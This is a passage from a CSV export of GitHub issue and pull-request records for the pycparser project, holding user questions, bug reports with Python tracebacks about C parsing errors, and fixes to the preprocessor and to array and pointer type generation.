Inserting `'.'` and `'..'` to `sys.path` before any `import` statements in `_build_tables.py` fixes this issue.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/321/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/321/comments,https://api.github.com/repos/eliben/pycparser/issues/321/events,https://github.com/eliben/pycparser/pull/321,https://api.github.com/repos/eliben/pycparser/pulls/321
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/320,430959315,MDU6SXNzdWU0MzA5NTkzMTU=,320, Converting C to AST and then from AST to C,9193894,closed,FALSE,NA,NA,5,2019-04-09T13:11:32Z,2019-04-10T16:57:08Z,2019-04-09T16:35:12Z,NONE,NA,"Hello,

I was looking at your framework and this tutorial about converting C to AST and then from AST to C. 


https://eli.thegreenplace.net/2011/03/07/from-c-to-ast-and-back-to-c-with-pycparser


I was trying to use it. 

At first I ran the following :



//Converting a code to AST
python dump_ast.py c_files/funky.c > funky_ast

//Convert the AST to C code
python c-to-c.py  funky_ast 




I got some errors as follow : 
```
Traceback (most recent call last):
File ""c-to-c.py"", line 60, in <module>
translate_to_c(sys.argv[1])
File ""c-to-c.py"", line 24, in translate_to_c
ast = parse_file(filename, use_cpp=True)
File ""/usr/local/lib/python2.7/dist-packages/pycparser/__init__.py"", line 90, in parse_file
return parser.parse(text, filename)
File ""/usr/local/lib/python2.7/dist-packages/pycparser/c_parser.py"", line 152, in parse
debug=debuglevel)
File ""/usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.py"", line 331, in parse
return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
File ""/usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.py"", line 1199, in parseopt_notrack
tok = call_errorfunc(self.errorfunc, errtoken, self)
File ""/usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.py"", line 193, in call_errorfunc
r = errorfunc(token)
File ""/usr/local/lib/python2.7/dist-packages/pycparser/c_parser.py"", line 1847, in p_error
column=self.clex.find_tok_column(p)))
File ""/usr/local/lib/python2.7/dist-packages/pycparser/plyparser.py"", line 67, in _parse_error
raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: funky_ast:1:8: before: :
```





So my quesion , Did I did something wrong, or I missunderstand this tool.



Thank you for you time and I hope you can reply to me.



Regards,",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/320/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/320/comments,https://api.github.com/repos/eliben/pycparser/issues/320/events,https://github.com/eliben/pycparser/issues/320,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/319,430684476,MDU6SXNzdWU0MzA2ODQ0NzY=,319,Same issue when run all the examples,45576021,closed,FALSE,NA,NA,4,2019-04-08T22:22:34Z,2019-05-22T14:17:32Z,2019-05-22T14:17:32Z,NONE,NA,"Hi, 

I am trying to run the examples provided and I got the same error even with my c files

➜  examples git:(master) ✗ python using_gcc_E_libc.py
Traceback (most recent call last):
  File ""using_gcc_E_libc.py"", line 29, in <module>
    cpp_args=['-E', r'-Iutils/fake_libc_include'])
  File ""../pycparser/__init__.py"", line 90, in parse_file
    return parser.parse(text, filename)
  File ""../pycparser/c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""../pycparser/ply/yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""../pycparser/ply/yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""../pycparser/ply/yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""../pycparser/c_parser.py"", line 1848, in p_error
    column=self.clex.find_tok_column(p)))
  File ""../pycparser/plyparser.py"", line 67, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: /usr/include/i386/_types.h:98:27: before: __darwin_va_list",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/319/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/319/comments,https://api.github.com/repos/eliben/pycparser/issues/319/events,https://github.com/eliben/pycparser/issues/319,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/318,430002738,MDU6SXNzdWU0MzAwMDI3Mzg=,318,how to extract the symbol table?,25927428,closed,FALSE,NA,NA,2,2019-04-06T06:19:29Z,2019-11-24T18:01:24Z,2019-04-06T13:03:21Z,NONE,NA,"Is there any API for symbol table?
Or should I build the symbol table myself?
Thx!",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/318/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/318/comments,https://api.github.com/repos/eliben/pycparser/issues/318/events,https://github.com/eliben/pycparser/issues/318,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/317,427527679,MDU6SXNzdWU0Mjc1Mjc2Nzk=,317,Visualise generated AST,10176876,closed,FALSE,NA,NA,1,2019-04-01T06:09:17Z,2019-04-02T12:20:53Z,2019-04-02T12:20:00Z,NONE,NA,Is there a way to convert generated AST into graphical format?,NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/317/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/317/comments,https://api.github.com/repos/eliben/pycparser/issues/317/events,https://github.com/eliben/pycparser/issues/317,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/316,425744274,MDU6SXNzdWU0MjU3NDQyNzQ=,316,Is there any way that I can get some specific nodes of the AST,9961022,closed,FALSE,NA,NA,1,2019-03-27T03:20:08Z,2019-03-27T13:11:43Z,2019-03-27T13:11:43Z,NONE,NA,"Hi, I'd like to know if it's feasible to get a specific node of the AST, like given a function name I can get that specific FuncCall node for further analysis instead of just print it. I've read the source code of NodeVisitor, seems that it's just going through the whole AST without returning anything.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/316/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/316/comments,https://api.github.com/repos/eliben/pycparser/issues/316/events,https://github.com/eliben/pycparser/issues/316,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/315,425695045,MDExOlB1bGxSZXF1ZXN0MjY0NzMxMDE5,315,Generate pointer types correctly,11742638,closed,FALSE,NA,NA,0,2019-03-26T23:35:38Z,2019-03-27T22:22:44Z,2019-03-27T22:22:44Z,CONTRIBUTOR,NA,"I just realized a few things:

- Pointer types are not generated correctly.  
Example:
```python
from pycparser import c_parser, c_ast, c_generator
parser = c_parser.CParser()
gen = c_generator.CGenerator()
ast = parser.parse('const int ** const  x;')

>>> gen.visit(ast.ext[0])
'const int ** const x'
>>> gen.visit(ast.ext[0].type)
'const int'
>>> gen.visit(ast.ext[0].type.type)
'const int'
>>> gen.visit(ast.ext[0].type.type.type)
'const int'
>>> 
```

In this PR I fixed it and now it makes more sense:

```python
>>> gen.visit(ast.ext[0])
'const int ** const x'
>>> gen.visit(ast.ext[0].type)
'const int ** const'
>>> gen.visit(ast.ext[0].type.type)
'const int *'
>>> gen.visit(ast.ext[0].type.type.type)
'const int'
```

- There is code duplication between `visit_ArrayDecl`/`visit_TypeDecl` and `_generate_type`. In order to use `_generate_type`, all that is needed is to prevent it from emitting the declname when we only want to generate these decls.  
In this PR I removed this code duplication.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/315/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/315/comments,https://api.github.com/repos/eliben/pycparser/issues/315/events,https://github.com/eliben/pycparser/pull/315,https://api.github.com/repos/eliben/pycparser/pulls/315
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/314,425116728,MDU6SXNzdWU0MjUxMTY3Mjg=,314,Failure parsing unnamed function parameters with array dim qualifiers,11742638,closed,FALSE,NA,NA,1,2019-03-25T21:09:02Z,2019-06-01T12:06:50Z,2019-06-01T12:06:50Z,CONTRIBUTOR,NA,"Consider the following:

```python
from pycparser import c_parser, c_ast, c_generator
parser = c_parser.CParser()
gen = c_generator.CGenerator()

ast1 = parser.parse(""int g(int i[const 20]);"")
ast2 = parser.parse(""int g(int[20]);"")
ast3 = parser.parse(""int g(int[const 20]);"")
```

This code will fail on the last line:
```
>>> ast3 = parser.parse(""int g(int[const 20]);"")
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""pycparser/c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""pycparser/ply/yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""pycparser/ply/yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""pycparser/ply/yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""pycparser/c_parser.py"", line 1847, in p_error
    column=self.clex.find_tok_column(p)))
  File ""pycparser/plyparser.py"", line 67, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: :1:11: before: const
```
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/314/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/314/comments,https://api.github.com/repos/eliben/pycparser/issues/314/events,https://github.com/eliben/pycparser/issues/314,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/313,424548135,MDExOlB1bGxSZXF1ZXN0MjYzODYzNDgx,313,Fix array type generation (#312),11742638,closed,FALSE,NA,NA,1,2019-03-23T21:41:38Z,2019-03-26T12:53:20Z,2019-03-26T12:53:20Z,CONTRIBUTOR,NA,"Also added `dim_quals` handling to `_generate_type`

Exmaple:

```python
>>> ast = parser.parse('int g(const int a[const 20]){}')
>>> gen.visit(ast.ext[0].decl.type.args.params[0])
'const int a[const 20]'
>>> gen.visit(ast.ext[0].decl.type.args.params[0].type)
'int[const 20]'
```",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/313/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/313/comments,https://api.github.com/repos/eliben/pycparser/issues/313/events,https://github.com/eliben/pycparser/pull/313,https://api.github.com/repos/eliben/pycparser/pulls/313
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/312,424435132,MDU6SXNzdWU0MjQ0MzUxMzI=,312,Generating array type,11742638,closed,FALSE,NA,NA,3,2019-03-22T23:35:19Z,2019-03-26T13:42:43Z,2019-03-26T13:42:43Z,CONTRIBUTOR,NA,"Consider the following:

```python
from pycparser import c_parser, c_ast, c_generator
parser = c_parser.CParser()
gen = c_generator.CGenerator()

ast = parser.parse(""int x[17];"")
gen.visit(ast.ext[0])
gen.visit(ast.ext[0].type)
```

Now, `gen.visit(ast.ext[0])` returns the expected result: `'int x[17]'`.
**However, `gen.visit(ast.ext[0].type)` returns: `'int17'`**

I would expect `gen.visit(ast.ext[0].type)` to return `'int[17]'`.  
Returning `'int17'` (the concatenation of `'int'` and `'17'`) just doesn't make sense.  

Trying to figure this out, I looked for `dim` on `c_generator.py` but the [only place it appears](https://github.com/eliben/pycparser/blob/992715f12aef69eb1351308f14fb5f1ff972ce57/pycparser/c_generator.py#L385) handles the concatenation of the square brackets as well, so I'm not sure where the `int17` could come from.

Any idea?",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/312/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/312/comments,https://api.github.com/repos/eliben/pycparser/issues/312/events,https://github.com/eliben/pycparser/issues/312,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/311,421420844,MDU6SXNzdWU0MjE0MjA4NDQ=,311,How to extracting  all doc comments from c using pycparser?,46930826,closed,FALSE,NA,NA,1,2019-03-15T09:14:39Z,2019-03-15T14:13:29Z,2019-03-15T14:13:29Z,NONE,NA,"a easy way of  finding comments in source code  is  to use **Regular Expressions**.
but  does pycparser provide  api  for finding doc  comments?",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/311/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/311/comments,https://api.github.com/repos/eliben/pycparser/issues/311/events,https://github.com/eliben/pycparser/issues/311,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/310,417054127,MDExOlB1bGxSZXF1ZXN0MjU4MTM3MjQ4,310,Fix crash when file starts with a semicolon,371089,closed,FALSE,NA,NA,1,2019-03-05T00:16:20Z,2019-04-16T14:48:36Z,2019-03-06T13:52:01Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/310/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/310/comments,https://api.github.com/repos/eliben/pycparser/issues/310/events,https://github.com/eliben/pycparser/pull/310,https://api.github.com/repos/eliben/pycparser/pulls/310
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/309,413776046,MDExOlB1bGxSZXF1ZXN0MjU1NjU2NTkx,309,C_generator arrayRef subscript fix,5899867,closed,FALSE,NA,NA,1,2019-02-24T03:15:47Z,2019-02-25T16:08:26Z,2019-02-25T16:04:39Z,NONE,NA,"If the subscript of an ArrayRef is a constant, the c_generator fails (as '+' cannot be used on a string and an int in python.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/309/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/309/comments,https://api.github.com/repos/eliben/pycparser/issues/309/events,https://github.com/eliben/pycparser/pull/309,https://api.github.com/repos/eliben/pycparser/pulls/309
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/308,410738822,MDU6SXNzdWU0MTA3Mzg4MjI=,308,get NoneType error in FuncCall visitor example with calling a function without given arguments,32974708,closed,FALSE,NA,NA,2,2019-02-15T12:03:10Z,2019-02-15T17:23:49Z,2019-02-15T14:41:58Z,NONE,NA,"Hello,

I'm trying [example/func_calls](https://github.com/eliben/pycparser/blob/master/examples/func_calls.py) to visit AST, but get some error in the follow program.
```C
int f1(int) {}
int f2() {}
void f3(void) {}
void f4() {}

int main(void) {
	int n = 3;
	f1(n);
	f2();
	// f3();
	// f4();
	return 0;
}
```
This example works fine when only call `f1(n)`, but it crashed when calling `f2`, `f3` or `f4`.
The Error Message show as follow:

```sh
pycparser/examples$ python3 func_calls.py c_files/test.c f
Traceback (most recent call last):
  File ""func_calls.py"", line 46, in <module>
    show_func_calls(filename, func)
  File ""func_calls.py"", line 35, in show_func_calls
    v.visit(ast)
  File ""../pycparser/c_ast.py"", line 158, in visit
    return visitor(node)
  File ""../pycparser/c_ast.py"", line 165, in generic_visit
    self.visit(c)
  File ""../pycparser/c_ast.py"", line 158, in visit
    return visitor(node)
  File ""../pycparser/c_ast.py"", line 165, in generic_visit
    self.visit(c)
  File ""../pycparser/c_ast.py"", line 158, in visit
    return visitor(node)
  File ""../pycparser/c_ast.py"", line 165, in generic_visit
    self.visit(c)
  File ""../pycparser/c_ast.py"", line 158, in visit
    return visitor(node)
  File ""func_calls.py"", line 29, in visit_FuncCall
    self.visit(node.args)
  File ""../pycparser/c_ast.py"", line 158, in visit
    return visitor(node)
  File ""../pycparser/c_ast.py"", line 164, in generic_visit
    for c in node:
TypeError: 'NoneType' object is not iterable
```",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/308/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/308/comments,https://api.github.com/repos/eliben/pycparser/issues/308/events,https://github.com/eliben/pycparser/issues/308,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/307,409812338,MDU6SXNzdWU0MDk4MTIzMzg=,307,version 2.19 fails to parse empty structs,1232673,closed,FALSE,NA,NA,0,2019-02-13T13:45:37Z,2019-02-13T13:50:47Z,2019-02-13T13:50:47Z,NONE,NA,"Still cannot parse empty structs in version 2.19, python 2.7. Running this code:
```
a = """"""
struct ngram_funcs_s 
{
}
;
""""""
from pycparser import c_parser
parser = c_parser.CParser()
parser.parse(a)
```
results in:
```
pycparser.plyparser.ParseError: :4:1: before: }
```",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/307/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/307/comments,https://api.github.com/repos/eliben/pycparser/issues/307/events,https://github.com/eliben/pycparser/issues/307,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/306,408490867,MDU6SXNzdWU0MDg0OTA4Njc=,306,"I have the same issue exactly,",45576021,closed,FALSE,NA,NA,1,2019-02-10T01:46:47Z,2019-02-11T13:55:43Z,2019-02-11T13:55:43Z,NONE,NA,"I have the same issue exactly, 

ast = parse_file(filename, use_cpp=True,
                     cpp_path='clang', 
                     cpp_args=['-E', r'-Iutils/fake_libc_include'])

and the parse_file function looks exactly as you post (I didn't change anything ), I use gcc -E for preprocess

_Originally posted by @Aishaaldosery in https://github.com/eliben/pycparser/issues/252#issuecomment-462096066_",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/306/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/306/comments,https://api.github.com/repos/eliben/pycparser/issues/306/events,https://github.com/eliben/pycparser/issues/306,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/305,403821749,MDU6SXNzdWU0MDM4MjE3NDk=,305,pycparser 2.18+ break pygit2,2866862,closed,FALSE,NA,NA,13,2019-01-28T13:45:42Z,2019-04-13T08:10:16Z,2019-04-08T13:03:42Z,NONE,NA,"```
____________________ ERROR collecting test/test_archive.py _____________________
../../../virtualenv/python3.4.6/lib/python3.4/site-packages/cffi/api.py:174: in _typeof
    result = self._parsed_types[cdecl]
E   KeyError: 'int (*git_transport_certificate_check_cb)(git_cert *cert, int valid, const char *host, void *payload)'
During handling of the above exception, another exception occurred:
../../../virtualenv/python3.4.6/lib/python3.4/site-packages/cffi/cparser.py:276: in _parse
    ast = _get_parser().parse(fullcsource)
../../../virtualenv/python3.4.6/lib/python3.4/site-packages/pycparser/c_parser.py:152: in parse
    debug=debuglevel)
../../../virtualenv/python3.4.6/lib/python3.4/site-packages/pycparser/ply/yacc.py:331: in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
../../../virtualenv/python3.4.6/lib/python3.4/site-packages/pycparser/ply/yacc.py:1199: in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
../../../virtualenv/python3.4.6/lib/python3.4/site-packages/pycparser/ply/yacc.py:193: in call_errorfunc
    r = errorfunc(token)
../../../virtualenv/python3.4.6/lib/python3.4/site-packages/pycparser/c_parser.py:1848: in p_error
    column=self.clex.find_tok_column(p)))
../../../virtualenv/python3.4.6/lib/python3.4/site-packages/pycparser/plyparser.py:67: in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
E   pycparser.plyparser.ParseError: <cdef source string>:2:7: before: git_transport_certificate_check_cb
During handling of the above exception, another exception occurred:
test/test_archive.py:36: in <module>
    from pygit2 import Index, Oid, Tree, Object
pygit2/__init__.py:41: in <module>
    from .remote import Remote, RemoteCallbacks, get_credentials
pygit2/remote.py:73: in <module>
    class RemoteCallbacks(object):
pygit2/remote.py:315: in RemoteCallbacks
    @ffi.callback('int (*git_transport_certificate_check_cb)'
../../../virtualenv/python3.4.6/lib/python3.4/site-packages/cffi/api.py:382: in callback
    cdecl = self._typeof(cdecl, consider_function_as_funcptr=True)
../../../virtualenv/python3.4.6/lib/python3.4/site-packages/cffi/api.py:177: in _typeof
    result = self._typeof_locked(cdecl)
../../../virtualenv/python3.4.6/lib/python3.4/site-packages/cffi/api.py:162: in _typeof_locked
    type = self._parser.parse_type(cdecl)
../../../virtualenv/python3.4.6/lib/python3.4/site-packages/cffi/cparser.py:476: in parse_type
    return self.parse_type_and_quals(cdecl)[0]
../../../virtualenv/python3.4.6/lib/python3.4/site-packages/cffi/cparser.py:479: in parse_type_and_quals
    ast, macros = self._parse('void __dummy(\n%s\n);' % cdecl)[:2]
../../../virtualenv/python3.4.6/lib/python3.4/site-packages/cffi/cparser.py:278: in _parse
    self.convert_pycparser_error(e, csource)
../../../virtualenv/python3.4.6/lib/python3.4/site-packages/cffi/cparser.py:307: in convert_pycparser_error
    raise CDefError(msg)
E   cffi.error.CDefError: cannot parse ""int (*git_transport_certificate_check_cb)(git_cert *cert, int valid, const char *host, void *payload)""
E   <cdef source string>:2:7: before: git_transport_certificate_check_cb
```

I'm pretty sure somebody did report a bug, but I can't find it..",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/305/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/305/comments,https://api.github.com/repos/eliben/pycparser/issues/305/events,https://github.com/eliben/pycparser/issues/305,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/304,397395732,MDU6SXNzdWUzOTczOTU3MzI=,304,Declaration of several variables at once does not generate a DeclList ,1379641,closed,FALSE,NA,NA,2,2019-01-09T14:29:30Z,2019-01-10T18:57:00Z,2019-01-10T11:33:26Z,NONE,NA,"Code such as `int a, b;` is apparently parsed the same as `int a; int b;`. This is semantically equivalent, but annoying for some uses.
For example, with code such as:
```
struct { int f; float g; } a, b;
```
Duplicating the type already appears more problematic.

By reading the code of c_generator, I noticed there was a code for handling this kind of declaration list, with  [fonction `visit_DeclList()`](https://github.com/eliben/pycparser/blob/master/pycparser/c_generator.py#L108). But I cannot manage to get it called. Is there something I miss somewhere?


Steps to reproduce:
```
>>> from pycparser import c_parser
>>> parser = c_parser.CParser()
>>> parser.parse('int a, b;')
FileAST(ext=[Decl(name='a',
                  quals=[
                        ],
                  storage=[
                          ],
                  funcspec=[
                           ],
                  type=TypeDecl(declname='a',
                                quals=[
                                      ],
                                type=IdentifierType(names=['int'
                                                          ]
                                                    )
                                ),
                  init=None,
                  bitsize=None
                  ),
             Decl(name='b',
                  quals=[
                        ],
                  storage=[
                          ],
                  funcspec=[
                           ],
                  type=TypeDecl(declname='b',
                                quals=[
                                      ],
                                type=IdentifierType(names=['int'
                                                          ]
                                                    )
                                ),
                  init=None,
                  bitsize=None
                  )
            ]
        )
>>>
```
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/304/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/304/comments,https://api.github.com/repos/eliben/pycparser/issues/304/events,https://github.com/eliben/pycparser/issues/304,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/303,395894540,MDU6SXNzdWUzOTU4OTQ1NDA=,303,Get list of operands and operators?,38988563,closed,FALSE,NA,NA,1,2019-01-04T11:29:45Z,2019-01-10T11:21:10Z,2019-01-10T11:21:10Z,NONE,NA,"Hello, is it possible to get list of operands and operators from AST tree? If there is no method, how should I analyze the tree to get them?",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/303/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/303/comments,https://api.github.com/repos/eliben/pycparser/issues/303/events,https://github.com/eliben/pycparser/issues/303,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/302,394531289,MDU6SXNzdWUzOTQ1MzEyODk=,302,Why `using_gcc_E_libc.py` does not work outside the source tree?,1018252,closed,FALSE,NA,NA,2,2018-12-28T02:37:25Z,2018-12-29T03:19:43Z,2018-12-29T03:19:43Z,NONE,NA,"`using_gcc_E_libc.py` works fine in `/tmp/pycparser/` source directory. But when I move it out, it does not work anymore. I tried to install pycparser from the source code. But it does not work. Does anybody know what is wrong?

```
/tmp/pycparser$ python setup.py install
running install
running build
running build_py
running install_lib
running install_egg_info
running egg_info
writing pycparser.egg-info/PKG-INFO
writing top-level names to pycparser.egg-info/top_level.txt
writing dependency_links to pycparser.egg-info/dependency_links.txt
reading manifest file 'pycparser.egg-info/SOURCES.txt'
reading manifest template 'MANIFEST.in'
warning: no previously-included files found matching 'setup.pyc'
warning: no previously-included files matching 'yacctab.*' found under directory 'tests'
warning: no previously-included files matching 'lextab.*' found under directory 'tests'
warning: no previously-included files matching 'yacctab.*' found under directory 'examples'
warning: no previously-included files matching 'lextab.*' found under directory 'examples'
writing manifest file 'pycparser.egg-info/SOURCES.txt'
removing '/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pycparser-2.19-py2.7.egg-info' (and everything under it)
Copying pycparser.egg-info to /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pycparser-2.19-py2.7.egg-info
running install_scripts
Build the lexing/parsing tables

/tmp$ python using_gcc_E_libc.py year.c 
Traceback (most recent call last):
  File ""using_gcc_E_libc.py"", line 29, in <module>
    cpp_args=['-E', r'-Iutils/fake_libc_include'])
  File ""/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pycparser/__init__.py"", line 90, in parse_file
    return parser.parse(text, filename)
  File ""/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pycparser/c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pycparser/ply/yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pycparser/ply/yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pycparser/ply/yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pycparser/c_parser.py"", line 1848, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pycparser/plyparser.py"", line 67, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: /usr/include/i386/_types.h:98:27: before: __darwin_va_list
```",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/302/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/302/comments,https://api.github.com/repos/eliben/pycparser/issues/302/events,https://github.com/eliben/pycparser/issues/302,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/301,394116597,MDExOlB1bGxSZXF1ZXN0MjQwOTQwODM1,301,"ply C-preprocessor: Fixes issues #299, #300",8604178,closed,FALSE,NA,NA,1,2018-12-26T08:43:20Z,2018-12-28T02:04:22Z,2018-12-28T02:04:22Z,NONE,NA,"Fixes errors in evaluation of #if a!=b (#299) and inclusion of files with non-ascii characters (#300)

Additionally, the include() and evalexpr() methods are split into a few smaller methods, which enables easier customization by overriding specific methods in derived classes",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/301/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/301/comments,https://api.github.com/repos/eliben/pycparser/issues/301/events,https://github.com/eliben/pycparser/pull/301,https://api.github.com/repos/eliben/pycparser/pulls/301
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/300,394109566,MDU6SXNzdWUzOTQxMDk1NjY=,300,Included ply CPP preprocessor does not read files with non-ascii characters,8604178,closed,FALSE,NA,NA,1,2018-12-26T08:06:04Z,2018-12-28T02:04:11Z,2018-12-28T02:04:11Z,NONE,NA,"In pycparser.ply.cpp.Preprocessor.include, files are opened as text using unspecified encoding, which result in using `locale.getpreferredencoding(False)`. Using a locale-dependent setting to parse source code is not a good thing. I think a safe default would be to use utf-8 with surrogate escape error handling, which allows all encodings to be decoded without data loss. GCC also uses utf-8 by default.

To provide more flexibility for the user, the reading of the included file could be done in a separate method, allowing the user of the class to override this specific part in a derived class (e.g. to substitute constant text for system include files)

I will prepare a PR.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/300/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/300/comments,https://api.github.com/repos/eliben/pycparser/issues/300/events,https://github.com/eliben/pycparser/issues/300,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/299,394108164,MDU6SXNzdWUzOTQxMDgxNjQ=,299,Included ply CPP preprocessor does not handle #if a != b correctly ,8604178,closed,FALSE,NA,NA,3,2018-12-26T07:58:12Z,2018-12-29T03:17:23Z,2018-12-28T02:03:48Z,NONE,NA,"pycparser.ply.cpp.Preprocessor.evalexpr does an attempt to convern a C-expression to a Python expression by converting ! to not (as in: `!(a==b)`) but inatvertendly it also convert `a!=b` to `a not =b` which is obviously not valid syntax.

Furthermore, undefined identifiers are replaced by `0L` which is not valid Python3 syntax, this should be just `0`.

Additionally, the preprocessing of the evaluation and the actual evaluation should be split into separate methods, such that when deriving from this class, the evaluation could be overridden while the preprocessing (macro expansion etc) stays as-is (in case e.g. due to security concerns one might not want to use eval)

I will prepare a PR.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/299/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/299/comments,https://api.github.com/repos/eliben/pycparser/issues/299/events,https://github.com/eliben/pycparser/issues/299,NA
